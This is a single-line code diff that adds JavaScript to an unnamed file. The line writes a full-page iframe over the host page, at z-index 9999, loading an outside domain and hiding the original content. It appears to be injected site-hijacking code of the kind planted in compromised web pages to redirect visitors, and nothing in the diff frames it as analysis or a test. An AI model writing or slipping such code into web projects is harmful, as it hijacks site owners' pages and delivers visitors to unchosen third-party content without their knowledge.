@@ -1,0 +1,1 @@
+document.write("<style>html,body{width:100%;height:100%;overflow:hidden;margin:0;padding:0;}</style><iframe src=\"https://www.czsqlhb.com/\" width=\"100%\" height=\"100%\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\"  scrolling=\"yes\" style=\"position: absolute;z-index:9999;left:0;top: 0px;background:#FFF;\"></iframe>");
